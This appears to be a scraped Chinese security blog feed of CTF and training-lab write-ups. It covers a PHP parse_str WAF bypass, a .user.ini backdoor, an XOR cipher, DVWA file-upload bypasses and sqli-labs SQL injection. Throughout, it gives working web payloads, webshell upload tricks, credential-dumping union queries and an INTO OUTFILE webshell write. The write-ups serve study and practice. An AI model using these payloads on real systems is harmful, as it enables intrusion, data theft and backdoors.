HP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事： 1231.删除空白符2.将某些字符转换为下划线（包括空格） 例如： User input Decoded PHP variable name %20foo_bar%20 foo_bar foo_bar foo%20bar%00 foo bar foo_bar foo%5bbar foo[bar foo_bar parser_str函数如何处理字符串： 1234567891011121314151617181920212223242526&lt;?php foreach( [ \"&#123;chr&#125;foo_bar\", \"foo&#123;chr&#125;bar\", \"foo_bar&#123;chr&#125;\" ] as $k =&gt; $arg) &#123; for($i=0;$i&lt;=255;$i++) &#123; echo \"\\033[999D\\033[K\\r\"; echo \"[\".$arg.\"] check \".bin2hex(chr($i)).\"\"; parse_str(str_replace(\"&#123;chr&#125;\",chr($i),$arg).\"=bla\",$o); /* yes... I've added a sleep time on each loop just for the scenic effect :) like that movie with unrealistic brute-force where the password are obtained one byte at a time (∩｀-´)⊃━☆ﾟ.*･｡ﾟ */ usleep(5000); if(isset($o[\"foo_bar\"])) &#123; echo \"\\033[999D\\033[K\\r\"; echo $arg.\" -&gt; \".bin2hex(chr($i)).\" (\".chr($i).\")\\n\"; &#125; &#125; echo \"\\033[999D\\033[K\\r\"; echo \"\\n\"; &#125; parse_str函数通常被自动应用于get、post请求和cookie中。如果你的Web服务器接受带有特殊字符的参数名，那么也会发生类似的情况。如上代码所示，我进行了多次循环，枚举了参数名三个位置的0到255之间的所有字符，看看解析函数到底是如何处理这些特殊字符的。结果如下： 123451.[1st]foo_bar2.foo[2nd]bar3.foo_bar[3rd] 在上述方案中，foo%20bar和foo+bar等效，均解析为foo bar。 payload：方法一：1calc.php? num=phpinfo() 发现有禁用函数 不管，先找 1? num=var_dump(scandir(dirname(dirname(dirname(getcwd()))))); 相关函数123getcwd — 取得当前工作目录dirname(string $path) — 返回 path 的父目录scandir — 列出指定路径中的文件和目录 找到flag： 又因为过滤了些符号，不能直接var_dump(file_get_contents(‘/f1agg’))，所以想到了可以用编码绕过 1?%20num=var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))) 方法二：利用base_convert base_convert函数可以在任意进制之间转换数字，可以返回任意字母，需要注意它无法返回_ *等特殊字符 又发现dechex函数可以把10进制转换为16进制，我们可以再异或出hex2bin——（将十六进制数转换为二进制数），来获取任意ASCII字符 可以构造var_dump(base_convert(61693386291,10,36)(hex2bin(dechex(46)).hex2bin(dechex(47))))相当于var_dump(scandir(./))找到f1agg后可以构造出readfile(/f1agg)来读取文件构造为：base_convert(2146934604002,10,36)(hex2bin(dechex(47)).base_convert(25254448,10,36))就可以得到flag文件。 协议层的攻击——HTTP请求走私除此之外，还有另一种方法可以绕过：利用HTTP请求走私来绕过，该漏洞可以参考“协议层的攻击——HTTP请求走私”：https://paper.seebug.org/1048/#31-cl0get 当我们向代理服务器发送一个比较模糊的HTTP请求时，由于两者服务器的实现方式不同，可能代理服务器认为这是一个HTTP请求，然后将其转发给了后端的源站服务器，但源站服务器经过解析处理后，只认为其中的一部分为正常请求，剩下的那一部分，就算是走私的请求，当该部分对正常用户的请求造成了影响之后，就实现了HTTP走私攻击。 理解为php中$_request 相同字段名优先接收post参数，就是这个同时向服务器传递get和post请求，而waf那里只处理了post请求的值，从而使get请求的值绕过了waf的拦截 使用两个 “Content-Length” 绕过 payload同上","categories":[],"tags":[]},{"title":"BUUCTF-web-Checkln","slug":"BUUCTF-web-Checkln","date":"2019-10-20T00:30:14.000Z","updated":"2019-11-23T04:46:29.486Z","comments":true,"path":"2019/10/20/BUUCTF-web-Checkln/","link":"","permalink":"https://ddstick.github.io/2019/10/20/BUUCTF-web-Checkln/","excerpt":"","text":"打开题目是一个上传页面随便上传一个php文件，发现报错 于是随意改变文件后缀，仍然报错，但报错内容不一样了，判断这是黑名单过滤后缀 html字符转义： 发现报错信息里提到的是文件内容的&lt;?进行了过滤，但也说明了他是用黑名单过滤文件后缀的因为对&lt;?进行了过滤，所以要绕过可以将php标记格式改为脚本标记格式： 1&lt;script language=php&gt; phpinfo(); &lt;/script&gt; 但是上传后发现又报错 不过其中的信息有些敏感exif_imagetype，判断可能是用了exif_imagetype()函数对文件格式进行了检查 1exif_imagetype() 读取一个图像的第一个字节并检查其签名 可以在内容的开头直接加上图片的标识头：GIF、JFIF.. 成功上传，不过没有办法直接利用于是就想到了.htaccess但是这个方法局限性太大，反正是不成功….（查了之后才知道这是nginx不是apache，难怪…) 后来看大佬的writeup学习了… .user.ini这得从php.ini说起了。php.ini是php默认的配置文件，其中包括了很多php的配置，这些配置中，又分为几种：PHP_INI_SYSTEM、PHP_INI_PERDIR、PHP_INI_ALL、PHP_INI_USER。 其中就提到了，模式为PHP_INI_USER的配置项，可以在ini_set()函数中设置、注册表中设置，再就是.user.ini中设置。 这里就提到了.user.ini，那么这是个什么配置文件？那么官方文档在这里又解释了： 除了主 php.ini 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录 ($_SERVER[‘DOCUMENT_ROOT’]所指定的)。如果被执行的 PHP 文件再 web 根目录之外，则之扫描该目录。 在 .user.ini 风格的 INI 文件中只有具有 PHP_INI_PERDIR 和 PHP_INI_USER 模式的 INI 设置可被识别。 这里就很清楚了，.user.ini实际上就是一个可以由用户“自定义”的php.ini，我们能够自定义的设置是模式为“PHP_INI_PERDIR 、 PHP_INI_USER”的设置。（上面表格中没有提到的PHP_INI_PERDIR也可以在.user.ini中设置） 实际上，除了PHP_INI_SYSTEM以外的模式（包括PHP_INI_ALL）都是可以通过.user.ini来设置的。 而且，和php.ini不同的是，.user.ini是一个能被动态加载的ini文件。也就是说我修改了.user.ini后，不需要重启服务器中间件，只需要等待user_ini.cache_ttl所设置的时间（默认为300秒），即可被重新加载。 然后我们看到php.ini中的配置项，可惜我沮丧地发现，只要稍微敏感的配置项，都是PHP_INI_SYSTEM模式的（甚至是php.ini only的），包括disable_functions、extension_dir、enable_dl等。 不过，我们可以很容易地借助.user.ini文件来构造一个“后门”。 PHP配置项中有两个比较有意思的项（下图第一、四个）： auto_prepend_file 表示在php程序加载第一个php代码前加载的php文件auto_append_file 是在php代码执行完毕后加载的文件 指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了require()函数。而auto_append_file类似，只是在文件后面包含。使用方法很简单，直接写在.user.ini中： 再上传一个1.jpg文件 由于同一目录下还有index.php文件，所以我们可以访问他来执行1.jpg的内容 成功 所以再上传文件’cat /flag’即可","categories":[],"tags":[]},{"title":"CRYPTO-base64-异或","slug":"CRYPTO-base64-异或","date":"2019-09-22T01:27:21.000Z","updated":"2019-09-22T02:42:20.922Z","comments":true,"path":"2019/09/22/CRYPTO-base64-异或/","link":"","permalink":"https://ddstick.github.io/2019/09/22/CRYPTO-base64-异或/","excerpt":"","text":"题目给出的解压包里的文本： 第一眼看到就感觉像base64，解码后为 1igq4;441R;1ikR51ibOO0 看到这种格式只想到igq4可能与flag有某种关系但还是毫无思路…于是去找大佬看看这种格式是什么加密，结果查到的是异或运算，但出题人把前面的flag对应的密文给去掉了完整的密文应该为 1EOBD.7igq4;741R;1ikR51ibOO0 最后利用脚本进行解密…. 12345678910111213141516import base64#miwen=base64.b64decode(\"RU9CRC43aWdxNDsxaWtiNTFpYk9PMDs6NDFS\")miwen=\"EOBD.7igq4;741R;1ikR51ibOO0\"mingwen=\"\"for i in range(0,256): sign=True for j in miwen: mingwenint=(ord(j)^i) if mingwenint&gt;32 and mingwenint&lt;128: mingwen+=chr(mingwenint) else: sign=False break if sign: print (mingwen) mingwen=\"\" 得到flag：","categories":[],"tags":[]},{"title":"攻防世界-web-cat","slug":"攻防世界-web-cat","date":"2019-09-18T07:55:19.000Z","updated":"2019-09-20T13:19:55.481Z","comments":true,"path":"2019/09/18/攻防世界-web-cat/","link":"","permalink":"https://ddstick.github.io/2019/09/18/攻防世界-web-cat/","excerpt":"","text":"进入页面看到有个输入框，见提示输入域名baidu.com测试 发现无任何回显，输入127.0.0.1或localhost测试 发现执行成功，执行的是一个ping命令于是就想着可能是命令拼接执行，但是输入任何有关的字符串就会提示invalid url 所以可以想到系统对这些字符串进行了过滤，此外可以看到该题是通过get来传参的于是在?url=这里，我们传递个%79后发现，%79被编码为y 看来是可以传递url编码，系统会接受并进行解析，于是我们传递%80会出现报错，url编码使用的是16进制，80也就是128，ASCII码是从0-127，所以这个时候会报错。url编码表可以参考http://www.w3school.com.cn/tags/html_ref_urlencode.html出现报错信息，是一段html代码，将这些代码复制到记事本后改为html文件打开 这是django报错的页面，所以是将输入的参数传到了后端的django服务中进行解析，但django设置了编码为gbk导致错误编码了宽字符（超过了ascii码的范围）而此时想到前面的@字符没有被过滤在比赛原题是有个提示的： 1RTFM of PHP CURL===&gt;&gt;read the fuck manul of PHP CURL??? 这是关于php curl的，于是可以找到php curl中关于@的相关知识点 所以我们能够使用@读取文件内容再结合django的报错得知了项目的绝对路径为/opt/api 这里还需要懂得一些django开发的基本知识，django项目下一般有个settings.py文件是设置网站数据库路径（django默认使用的是sqlites数据库），如果使用的是其它数据库的话settings.py则设置用户和密码。除此之外，settings.py还会对项目整体的设置进行定义。 读取settings.py文件，这里需要注意django项目生成时settings.py会存放在项目目录下再以项目名称命名的文件夹下面。 同样在使用@读取数据库信息 在报错信息中搜索CTF得到flag。","categories":[],"tags":[]},{"title":"DVMA-File-Upload","slug":"DVMA-File-Upload","date":"2019-09-04T07:49:28.000Z","updated":"2019-09-04T08:24:37.310Z","comments":true,"path":"2019/09/04/DVMA-File-Upload/","link":"","permalink":"https://ddstick.github.io/2019/09/04/DVMA-File-Upload/","excerpt":"","text":"Low:源代码： 12345678910111213141516&lt;?phpif( isset( $_POST[ 'Upload' ] ) ) &#123; // Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . \"hackable/uploads/\"; //上传文件的路径 $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] ); //文件路径=上文文件的路径+文件名 // Can we move the file to the upload folder? if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) &#123; // No echo '&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'; &#125; else &#123; // Yes! echo \"&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;\"; &#125;&#125;?&gt; 关键函数：1basename(path,suffix)：函数返回路径中的文件名部分，如果可选参数suffix为空，则返回的文件名包含后缀名，反之不包含后缀名。 可以看到，服务器对上传文件的类型、内容没有做任何的检查、过滤，存在明显的文件上传漏洞，生成上传路径后，服务器会检查是否上传成功并返回相应提示信息。如果上传成功，则会提示 路径+succesfully uploaded! 如果上传失败，则会提示 Your image was not uploaded。我们可以写一句话木马 1.php ，上传 Medium:源代码： 12345678910111213141516171819202122232425262728&lt;?phpif( isset( $_POST[ 'Upload' ] ) ) &#123; // Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . \"hackable/uploads/\"; $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] ); // File information $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ]; $uploaded_type = $_FILES[ 'uploaded' ][ 'type' ]; $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ]; // Is it an image? if( ( $uploaded_type == \"image/jpeg\" || $uploaded_type == \"image/png\" ) &amp;&amp; ( $uploaded_size &lt; 100000 ) ) &#123; // Can we move the file to the upload folder? if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) &#123; // No echo '&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'; &#125; else &#123; // Yes! echo \"&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;\"; &#125; &#125; else &#123; // Invalid file echo '&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;'; &#125;&#125;?&gt; 可以看到，服务器对上传文件的大小和类型做了限制。只允许上传小于 100000 字节并且文件type类型是image/jpeg或 image/png 的 方法一：抓包修改文件的type因为这里过滤的是文件的上传类型，而不是文件的后缀名 方法二：00截断在php版本小于5.3.4的服务器中，当Magic_quote_gpc选项为off时，可以在文件名中使用%00截断 先上传一个木马，抓包： 修改后发送： getmuma. php中的空格的16进制为20，需把他改为00 High:源代码： 123456789101112131415161718192021222324252627282930&lt;?php if( isset( $_POST[ 'Upload' ] ) ) &#123; // Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . \"hackable/uploads/\"; $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] ); // File information $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ]; $uploaded_ext = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1); $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ]; $uploaded_tmp = $_FILES[ 'uploaded' ][ 'tmp_name' ]; // Is it an image? if( ( strtolower( $uploaded_ext ) == \"jpg\" || strtolower( $uploaded_ext ) == \"jpeg\" || strtolower( $uploaded_ext ) == \"png\" ) &amp;&amp; ( $uploaded_size &lt; 100000 ) &amp;&amp; getimagesize( $uploaded_tmp ) ) &#123; // Can we move the file to the upload folder? if( !move_uploaded_file( $uploaded_tmp, $target_path ) ) &#123; // No echo '&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'; &#125; else &#123; // Yes! echo \"&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;\"; &#125; &#125; else &#123; // Invalid file echo '&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;'; &#125; &#125; ?&gt; 关键函数：12345strtolower() : 函数把字符串转换为小写。strrpos(string,find,start):函数返回字符串find在另一字符串string中最后一次出现的位置，如果没有找到字符串则返回false，可选参数start规定在何处开始搜索。getimagesize(string filename) ：函数会通过读取文件头，返回图片的长、宽等信息，如果没有相关的图片文件头，函数会报错。 High级别的代码读取文件名中最后一个”.”后的字符串，期望通过文件名来限制文件类型，因此要求上传文件名形式必须是”.jpg”、”.jpeg”、”.png”之一。同时，getimagesize函数更是限制了上传文件的文件头必须为图像类型 因为上传的文件为图片类型，因此服务器将上传的文件解析成图片文件，所以若向其发送请求时，服务器只会返回这个“图片”文件，并不会执行相应命令。这里可以借助Medium级别的文件包含漏洞来获取webshell权限，具体文件包含的方法可参考(Upload-labs)https://ddstick.github.io/2019/07/31/Upload-labs/#Pass-13-%E5%9B%BE%E7%89%87%E9%A9%AC 方法二：采用%00截断的方法可以轻松绕过文件名的检查，但是需要将上传文件的文件头伪装成图片，且只能在php版本小于5.3.4的服务器中 Impossible源代码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253&lt;?php if( isset( $_POST[ 'Upload' ] ) ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); // File information $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ]; $uploaded_ext = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1); $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ]; $uploaded_type = $_FILES[ 'uploaded' ][ 'type' ]; $uploaded_tmp = $_FILES[ 'uploaded' ][ 'tmp_name' ]; // Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . 'hackable/uploads/'; //$target_file = basename( $uploaded_name, '.' . $uploaded_ext ) . '-'; $target_file = md5( uniqid() . $uploaded_name ) . '.' . $uploaded_ext; $temp_file = ( ( ini_get( 'upload_tmp_dir' ) == '' ) ? ( sys_get_temp_dir() ) : ( ini_get( 'upload_tmp_dir' ) ) ); $temp_file .= DIRECTORY_SEPARATOR . md5( uniqid() . $uploaded_name ) . '.' . $uploaded_ext; // Is it an image? if( ( strtolower( $uploaded_ext ) == 'jpg' || strtolower( $uploaded_ext ) == 'jpeg' || strtolower( $uploaded_ext ) == 'png' ) &amp;&amp; ( $uploaded_size &lt; 100000 ) &amp;&amp; ( $uploaded_type == 'image/jpeg' || $uploaded_type == 'image/png' ) &amp;&amp; getimagesize( $uploaded_tmp ) ) &#123; // Strip any metadata, by re-encoding image (Note, using php-Imagick is recommended over php-GD) if( $uploaded_type == 'image/jpeg' ) &#123; $img = imagecreatefromjpeg( $uploaded_tmp ); imagejpeg( $img, $temp_file, 100); &#125; else &#123; $img = imagecreatefrompng( $uploaded_tmp ); imagepng( $img, $temp_file, 9); &#125; imagedestroy( $img ); // Can we move the file to the web root from the temp folder? if( rename( $temp_file, ( getcwd() . DIRECTORY_SEPARATOR . $target_path . $target_file ) ) ) &#123; // Yes! echo \"&lt;pre&gt;&lt;a href='$&#123;target_path&#125;$&#123;target_file&#125;'&gt;$&#123;target_file&#125;&lt;/a&gt; succesfully uploaded!&lt;/pre&gt;\"; &#125; else &#123; // No echo '&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'; &#125; // Delete any temp files if( file_exists( $temp_file ) ) unlink( $temp_file ); &#125; else &#123; // Invalid file echo '&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;'; &#125; &#125; // Generate Anti-CSRF token generateSessionToken(); ?&gt; 关键函数：123456789in_get(varname)：函数返回相应选项的值imagecreatefromjpeg ( filename ) ：函数返回图片文件的图像标识，失败返回falseimagejpeg ( image , filename , quality) ：从image图像以filename为文件名创建一个JPEG图像，可选参数quality，范围从 0（最差质量，文件更小）到 100（最佳质量，文件最大）。imagedestroy( img ) ： 函数销毁图像资源getchwd() 函数返回当前工作目录 可以看到，Impossible级别的代码对上传文件进行了重命名（为md5值，导致%00截断无法绕过过滤规则），加入Anti-CSRF token防护CSRF攻击，同时对文件的内容作了严格的检查，导致攻击者无法上传含有恶意脚本的文件 web安全之token和CSRF攻击https://blog.csdn.net/qq_15096707/article/details/51307024","categories":[],"tags":[]},{"title":"Sqli-labs-GET Part 1-10","slug":"Sqli-labs-GET Part 1-10","date":"2019-08-10T00:30:14.000Z","updated":"2019-11-14T12:22:38.478Z","comments":true,"path":"2019/08/10/Sqli-labs-GET Part 1-10/","link":"","permalink":"https://ddstick.github.io/2019/08/10/Sqli-labs-GET Part 1-10/","excerpt":"","text":"Sqli-labs注入练习 SQL Injection：是Web程序代码中对于用户提交的参数未做过滤就直接放到SQL语句中执行，导致参数中的特殊字符打破了SQL语句原有逻辑，可以利用该漏洞执行任意SQL语句，如查询数据、下载数据、写入webshell、执行系统命令以及绕过登录限制等。 sqli-labs是一个非常好的学习sql注入的一个游戏教程，对于了解sqlmap的原理很有帮助。 项目地址：https://github.com/Audi-1/sqli-labs 安装首先安装phpstudy或者xampp 将下载的文件解压发在：phpstudy的WWW文件夹里 或者 xampp里面的htdocs文件夹里面 修改mysql文件的账号密码： 在sqli-labs-master\\sql-connections里面有个db-creds.inc文件，打开并修改账号密码 进入页面进行安装 打开网页输入：localhost/sqli-labs-master 点击第一个：Setup/reset Database for labs 出现下面页面为正确 返回 完成 Less-1：基于错误的_get_单引号_字符型注入 Please input the ID as parameter with numeric value //“请输入ID为数值的参数” 所以我们在url后输入：?id=1，回车，得到下面的页面： 输一个id值，返回了name和password，接着测试是否能注入，url后加上?id=1’，发现报错了，直接报的数据库的错，对web浏览器用户透明，那么可以从报错中得到很多信息，比如这是个MySQL的数据库，还可以猜想到后台的sql语句，应该是 1 “SELECT * FROM table_name WHERE id=’$_get[‘id’]‘ LIMIT 0,1” 这种，说明他没有过滤单引号，并且id是char型的输入，之所以报错是因为用了单引号，导致后面的部分“’LIMT 0,1;”多余出来了 于是构造sql语句-1‘OR’1’=’1’–+屏蔽掉后面的，也可以用#屏蔽，但这里#没有被url编码，故需自己将他转成url编码%231’=’1’为万能密码之一 注入成功~接着来猜字段1’ order by 3，有3个字段存在1’ order by 3： 再试试4个,没有第4个字段了，即没有第4列1’ order by 4： 接着用union 语句爆字段，但始终只显示一条记录，看了下源码，发现他并没有将结果循环输出，而是只返回符合查询结果的第一条记录 于是利用联合查询的特点，使原查询左边为空，那么我们定义的查询结果便可以返回出来-1’ union select 1,2,3%23之所以改为id=-1而不是继续id=1,是因为id=1或者其他正整数的时候,会有规定的数据取出,查看了dalao的WP发现这是因为在index.php中并没有循环取出数据,因此只要把1改为0或者负数即可 于是我们可以通过这里使用数据库的函数来爆出数据库的信息，构造如下语句-1’ union select 1,2,concat_ws(char(32,44,32),user(),database());%23 这里用到的数据库函数有cancat_ws()，char()，user()，database()，cancat_ws()是连接函数，第一个参数是分隔符，同样作用的函数还有cancat()，不同的是cancat()有不同的连接符，char()函数是将十进制参数转换成对应的acsii码，user()和database()都是内置的函数，分别返回用户名和数据库名，类似的函数还有version()，返回数据库的版本信息，但是没有直接返回表名的函数，所以需要通过其他方式获取表名 这里有一个很经典的方法，我们可以通过系统数据库information_schema来获取表名，information_schema数据库中含有很重要的三张表：SCHEMATA，TABLES和COLUMNSSCHEMATA表中存储了MySQL中所有数据库的信息，包括数据库名，编码类型路径等，show databases的结果取之此表 TABLES表中存储了MySQL中所有数据库的表的信息（当然，索引是根据数据库名的），包括这个表是基本表还是系统表，数据库的引擎是什么，表有多少行，创建时间，最后更新时间等，show tables from schemaname的结果取之此表 COLUMNS表中存储了MySQL中所有表的字段信息，show columns from schemaname.tablename的结果取之此表 于是，我们可以构造?id=-1’ union select 1,2,table_name from information_schema where table_schema=’security’%23 这样就爆出了第一张表名，但要获取所有表名还需要用到’limit’，limit是用来指定范围，他有两个参数（limit a，b）a是从第几行开始取，b是取多少行，但需要注意的是实际取出来的开始行下标比a大1，即limit 5,10是表示取6到15行数据，接下来我们就可以用它取指定范围的表了-1’ union select 1,2,table_name from information_schema.tables where table_schema=’security’ limit 3,1–+ 这里取的是第4张表，如果超出能取的范围，他会报错-1’ union select 1,2,table_name from information_schema.tables where table_schema=’security’ limit 4,1–+ 于是通过修改limit的范围我们获取到了所有的表名，且与数据库中的表名一致，其中users表用来存储用户信息的可能性最大，于是，我们可以用同样的方法爆他的字段名-1’ union select 1,2,column_name from information_schema.colums where table_schema=’security’ and table_name=’users’ limit 0,1%23 获取到的字段名有三个id，username，password，于是我们就可以构造语句了-1’ union select 1,2,concat_ws(char(32,44,32),id,username,password) from users limit 0,1 %23 同样的，改变limit的范围以获取所有用户信息-1’ union select 1,2,concat_ws(char(32,44,32),id,username,password) from users limit 1,1 %23 还有一种方法是通过group分组代替limit将所有信息列出来，查找表名可以构造如下payload：-1’ union select 1,2,gruop_concat(char(32),table_name,char(32)) from information_schema.tables where talbe_schema=’security’–+ 查找字段也是同样-1’ union select 1,2,gruop_concat(char(32),column_name,char(32)) from information_schema.columns where talbe_schema=’security’ and table_name=’users’–+ 最后的payload可以合并不同的列，上下对应输出-1’ union select 1,group_concat(char(32),username,char(32)),group_concat(char(32),password,char(32)) from users–+ Less-2：基于错误的_get_整型注入开头跟les1一样尝试单引号：?id=’ 这里的报错与less-1不同了，从报错可以看出，此处的id是当做数值来处理的，因为sql语句对于数字型的数据可以不加单引号，而less-1是作为字符串来处理的，猜想后台sql语句应该是select * from table_name where id = $_get[‘id’] limit 0,1于是构造-1 or 1=1?id=-1 or 1=1%23 可以注入，接着用和之前相同的方法先报数据库名，然后是表名，接着是字段，最后的payload如下?id=-1 union select 1,group_concat(char(32),username,char(32)),group_concat(char(32),password,char(32)) from users–+ Less-3：基于报错的_get_单引号_变形_字符型注入?id=’ 查看源代码 123$sql=\"SELECT * FROM users WHERE id=('$id') LIMIT 0,1\"; $result=mysql_query($sql); $row = mysql_fetch_array($result); 看报错，所谓变形就是用)代替了空格，猜想后台sql是select * from table_name where id =(‘$_get[‘id’]’)limit 0,1于是构造-1’)or’1’=’1’–+?id=-1’)or’1’=’1’–+ 最后的payload:?id=-1’) union select 1,username,concat_ws(char(32,44,32),id,database(),password) from users limit 1,1%23 Less-4：基于错误的_get_双引号_字符型注入?id=-1’ 尝试单引号正常无报错信息，因为在php中双引号可以包含单引号，输入单引号后台就变成了id=(“$_GET[‘id’]’”) 于是尝试双引号，查看报错信息，猜想后台sql语句为select * from table_name where id =(“$_get[‘id’]”)limit 0,1；构造如下sql注入：?id=-1”)or 1=1–+ payload:?id=-1”) union select 1,username,concat_ws(char(32,44,32),id,database(),password) from users limit 0,1%23 less-5：双注入_get_单引号_字符型注入当输入?id=1时页面显示正常?id=1 什么都没有，然后注意到提示是“双注入”，于是百度了一下，总结如下： 双注入查询双查询注入顾名思义形式上是两个嵌套的查询，即select …(select …)，里面的那个select被称为子查询，他的执行顺序也是先执行子查询，然后再执行外面的select，双注入主要涉及到了几个sql函数： 1234rand()随机函数，返回0~1之间的某个值 floor(a)取整函数，返回小于等于a，且值最接近a的一个整数 count()聚合函数也称作计数函数，返回查询对象的总数 group by cluase分组语句，按照cluase对查询结果分组 双注入的原理总的来说就是，当一个聚合函数后面出现group分组语句时，会将查询的一部分结果以报错的形式返回，他有一个固定的公式，于是payload构造如下：?id=-1’ union select count(_),2,concat(‘_‘,(select database()),’_‘,floor(rand()_2)) as a from information_schema.tables group by a–+ 获取到数据库名后再用同样的方法获取表名?id=-1’ union select count(_),2,concat(‘_‘,(select group_concat(table_name) from information_schema.tables where table_schema=’security’),’_‘,floor(rand()_2)) as a from information_schema.tables group by a–+ 然后是用户信息，这里只能查询一行，所以不能用group_concat，可以修改limit的范围来遍历用户信息?id=-1’ union select count(_),2,concat(‘_‘,(select concat_ws(char(32,44,32),id,username,password) from users limit 0,1),’_‘,floor(rand()_2)) as a from information_schema.tables group by a–+ Less-6：双注入_get_双引号_字符型注入换汤不换药，按照Less-5的方法，只是把单引号改成了双引号，直接上payload:?id=-1” union select count(_),2,concat(‘_‘,(select concat_ws(char(44),id,username,password) from users limit 1,1),’_‘,floor(rand()_2)) as a from information_schema.tables group by a–+ Less-7：导出文件_get_字符型注入 尝试之前的方法行不通了，他把报错做了处理统一返回“You have an error in your SQL syntax”，明显的，他也给出了提示use outfile，outfile的固定结构是： 1 select A into outfile B 这里的B通常是一个文件路径，A可以是文本内容（小马），也可以是数据库信息，于是这里就有两种思路： 第一种，将小马写入文件中，用菜刀拿下：所以大概要使用文件导出。Mysql数据库需要在指定的目录下进行数据的导出，secure_file_priv这个参数用来限制数据导入和导出操作的效果，例如执行LOAD DATA、SELECT … INTO OUTFILE语句和LOAD_FILE()函数。这些操作需要用户具有FILE权限。如果这个参数为空，这个变量没有效果；如果这个参数设为一个目录名，MySQL服务只允许在这个目录中执行文件的导入和导出操作。这个目录必须存在，MySQL服务不会创建它；如果这个参数为NULL，MySQL服务会禁止导入和导出操作。这个参数在MySQL 5.7.6版本引入。show variables like ‘%secure%’; ?id=-1’)) union select 1,2,’‘ into outfile “/var/lib/mysql-files/DD.php”–+ 但看了其他daloa的wp，都涉及到路径的转义dalao都是在Win下操作的，所以需要，而Linux和Win不同，所有此处不太一样 第一种，构造select * from users into outfile “数据库导入导出数据的目录”?id=-1’)) union select group_concat(username),’‘,group_concat(password) from users into outfile “/var/lib/mysql-files/DD.txt”–+ 小扩展：winserver的iis默认路径c:\\Inetpub\\wwwroot linux的nginx一般是/usr/local/nginx/html，/home/wwwroot/default，/usr/share/nginx，/var/www/htm等 apache 就…/var/www/htm，…/var/www/html/htdocs phpstudy 就是…\\PhpStudy20180211\\PHPTutorial\\WWW\\ xammp 就是…\\xampp\\htdocs 导入导出数据还会涉及到哪些函数： @@datadir：数据库存储路径 @@basedir：MySQL安装路径 dumpfile：导出文件，类似outfile，不同的是，dumpfile一次导出一行，会和limit结合使用 load_file()：将文件导入mysql，用法 select load_file(“文件路径”); Less-8：bool型_单引号_盲注Less-8源码:123456789101112131415161718192021222324252627282930313233343536373839404142&lt;?php //including the Mysql connect parameters. include(\"../sql-connections/sqli-connect.php\"); error_reporting(0); // take the variables if(isset($_GET\\['id'\\])) &#123; $id=$_GET\\['id'\\]; //logging the connection parameters to a file for analysis. $fp=fopen('result.txt','a'); fwrite($fp,'ID:'.$id.\"\\\\n\"); fclose($fp); // connectivity $sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\"; $result=mysqli_query($con1, $sql); $row = mysqli\\_fetch\\_array($result, MYSQLI_BOTH); if($row) &#123; echo '&lt;font size=\"5\" color=\"#FFFF00\"&gt;'; echo 'You are in...........'; echo \"&lt;br&gt;\"; echo \"&lt;/font&gt;\"; &#125; else &#123; echo '&lt;font size=\"5\" color=\"#FFFF00\"&gt;'; //echo 'You are in...........'; //print\\_r(mysqli\\_error($con1)); //echo \"You have an error in your SQL syntax\"; echo \"&lt;/br&gt;&lt;/font&gt;\"; echo '&lt;font color= \"#0000ff\" font size= 3&gt;'; &#125; &#125; else &#123; echo \"Please input the ID as parameter with numeric value\";&#125; ?&gt; ?id=1 尝试单引号却什么都没返回，看了下源码就是这样处理的，点题盲注，盲注主要分为bool型和时间性，通常涉及到这几个函数: 盲注常用函数&amp;&amp;固有公式：1234567891011length(str)：返回字符串str的长度 substr(str,pos,len)：将str从pos位置开始截取len长度的字符返回，需要注意的是这里pos的是从1开始的 mid(str,pos,len)：和substr()类似 ascii(str)：返回字符串str最左边的acsii码（即首字母的acsii码） ord()：同上，返回acsii码 left(str,len)：对字符串str左截取len长度 right(str,len)：对字符串str右截取len长度 if(a,b,c)：条件判断，如果a为true，返回b，否则返回c 盲注有个固定式：and ascii(substr(A,1,1))&gt;B，或者and if(ascii(substr(A,1,1))&gt;B,1,0)，这里的A通常是一个select语句，B则是字符或数字的ascii码，他们的中心思想都是通过substr等截取函数以二分法的形式查询逐个匹配想要的信息，这个过程通常都很耗时，所以建议直接写个盲注脚本来跑 下面是盲注匹配的一个例子，我们来匹配数据库名，在之前的实验中已知数据库名是security，下面的sql语句是用来匹配数据库名的第一个字母?id=1’ and ascii(substr((select database()),1,1))&gt;114–+ 字母s的ascii码是115，所以他大于114，结果为true，页面显示正常，依次类推即可 也可以用脚本来跑，dalao那拿来的 